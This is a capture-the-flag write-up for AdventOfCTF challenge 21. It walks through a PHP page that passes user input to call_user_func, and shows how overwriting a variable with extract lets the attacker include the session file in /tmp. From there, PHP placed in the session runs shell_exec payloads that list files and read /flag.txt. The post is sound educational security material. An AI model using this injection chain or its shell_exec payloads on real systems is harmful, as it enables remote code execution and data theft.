+++
author = "Maik de Kruif"
title = "Challenge 21 - AdventOfCTF"
date = 2021-02-26T11:45:53+01:00
description = "A writeup for challenge 21 of AdventOfCTF."
cover = "img/adventofctf/a4afd1fffb0b662d849a6907767f0625.png"
tags = [
    "AdventOfCTF",
    "challenge",
    "ctf",
    "hacking",
    "writeup",
    "web",
    "python",
    "serialization",
]
categories = [
    "ctf",
    "writeups",
    "hacking",
]
+++

- Points: 2100

## Description

We are testing a new mechanism to filter out malicious content from URLs. This application is the test page for this feature. I hope it works, these hackers are very active!

The flag is in /flag.txt

Visit https://21.adventofctf.com to start the challenge.

## Recon

Upon opening the challenge website, we're greeted with some PHP code:

```php
<?php
error_reporting(0);

ini_set('display_errors', 0);
ini_set('open_basedir', '/var/www/html:/tmp');

# Make sure no evil things are passed in the URL
$file = 'filters.php';
$func = isset($_GET['function'])?$_GET['function']:'filters';
call_user_func($func,$_GET);
include($file);

# Save the name for later
session_start();
if ($_POST["name"]){
    $_SESSION["name"] = $_POST["name"];
}

header("Location: /index.php");
exit();
?>
```

Besides this, we can also see an input field for a name. From it's source, we can tell it send a `POST` request to `/get_flag.php` upon submitting the form.

## Analyzing the code

Let's start by going over the PHP code line by line.

```php
ini_set('display_errors', 0);
ini_set('open_basedir', '/var/www/html:/tmp');
```

The code starts by setting two PHP settings. The first one is pretty obvious; it disables the display of errors. The second one is a little more interesting. If we take a look at the [php documentation](https://www.php.net/manual/en/ini.core.php#ini.open-basedir) we find the following:

> Limit the files that can be accessed by PHP to the specified directory-tree, including the file itself.
> [...]
> When a script tries to access the filesystem, for example using include, or fopen(), the location of the file is checked. When the file is outside the specified directory-tree, PHP will refuse to access it.

This means we can, thus, only read files from the `/var/www/html` and `/tmp` directory. This is peculiar as we normally don't need to read anything from the `/tmp` folder.

```php
# Make sure no evil things are passed in the URL
$file = 'filters.php';
$func = isset($_GET['function'])?$_GET['function']:'filters';
call_user_func($func,$_GET);
include($file);
```

Moving on ot the next part, two variables are set: `$file` and `$func`. `$file` is set to a path which is later included with `include($file)`. To set the `$func` variable, the code will first check if `$_GET['function']` exists, and if so sets the variable to it, otherwise, the variable is set to the string `"filters"`.

After setting these variables, the script will execute `call_user_func` with two parameters. To see what this function does, we can have a look at the [docs](https://www.php.net/manual/en/function.call-user-func.php) again:

> Calls the callback given by the first parameter and passes the remaining parameters as arguments.

This means it will execute the function saved in `$func`, which, we can set using the `GET` parameter `function`. It also passes all `GET` parameters as arguments.

After calling `call_user_func`, it [includes](https://www.php.net/manual/en/function.include.php) the `$file` variable. This means it will take the contents of the file at the path saved in `$file` and pretend it was written here.

```php
# Save the name for later
session_start();
if ($_POST["name"]){
    $_SESSION["name"] = $_POST["name"];
}
```

This part is also interesting. The code start a session and, if the `"name"` parameter exists in a `POST` request to this page, saves it to this session.

The interesting part is that we don't see it being used anywhere.

```php
header("Location: /index.php");
exit();
```

Finally, the script will add a `Location` header with `/index.php` as the content, this is basically a redirect, and then exits the process.

### Summary

Let's put this all together.

Firstly, the code restricts the read access of our program to `/var/www/html` and `/tmp`. It then, if it exists, calls the function passed in the `GET` parameter `function`. If it isn't set, it will call the `filters` function instead. Afterwards, it includes a file at the path saved in `$file`.

After all of this, it will start a session and, if the `POST` parameter `name` is set, saves the contents of that parameter to the session.

## Finding the vulnerability

The goal is to read the `/flag.txt` file which is not saved in either `/var/www/html` nor `/tmp`. This means we cannot exploit the `include` function to read it directly.

Let's have another look at the bottom code for the session. A variable in the session is set, but where is it actually saved? As PHP doesn't "run" like a python server would, it can't save it to memory. This means the session is probably saved to a file.

If we have a look on Google, we can find that PHP sessions are saved as separate files in the OS's temporary directory. For Linux, this is `/tmp`.

Hooray! This means the `include` function can access the session files. This is quite useless though if we can't actually use the include function. So let's get to that first.

### Including files

The only way to include a file from what I can see is to either use `call_user_func` to include a file, or use `call_user_func` to somehow overwrite the `&file` variable.

The first approach won't work though as `GET` parameters always have a name, and the `include` function doesn't use those.

There is, however, a way to overwrite the `&file` variable. We can do this using PHP's `extract` function.

From the [docs](https://www.php.net/manual/en/function.extract):

> extract — Import variables into the current symbol table from an array

In English, this means it imports the variables from the passed array into our code.

This is great as the passed array is the `$_GET` array. This is an array in which all our `GET` parameters are saved. This means that if we add a parameter with the name "file", it will, hopefully, overwrite the existing variable.

Let's test this. Firstly we have to set the name variable. To do this we can just enter some text in the input field and press submit. After this, we can make a `GET` request to `/get_flag.php` to read the file.

To make this request, we first need the session token. We can find in the cookies in our browser. For me, it was `e62ac597cd97e0638d898fff45c3b878`. Afterwards, we can make a request like this to get the contents of our session file: `/get_flag.php?function=extract&file=/tmp/sess_e62ac597cd97e0638d898fff45c3b878`.

This then returns the following:

```text
name|s:15:"Your cool name!";
```

As we can see, our input is directly saved to the file. Because we are reading the file using `include`, it also executes any PHP code it finds there. Let's verify that by setting our name to `<?php phpinfo(); ?>`.

If we now open the page with our file read again, we see the PHP info.

## Exploit

Now that we have PHP injection, we can easily turn this into Remote Code Execution (RCE). We do this by using the `shell_exec` function like so:

```php
<?php echo shell_exec("ls"); ?>
```

If we send this as the name, we get the following result:

```text
name|s:31:"error_pages
favicon.ico
filters.php
get_flag.php
index.php
logo.png
style.css
";
```

The description told us the flag was located at `/flag.txt` so let's open it using the following input:

```php
<?php echo shell_exec("cat /flag.txt"); ?>
```

## Solution

We got the flag! It is `NOVI{extract_1s_ev1l_on_us3r_inpu7}`.
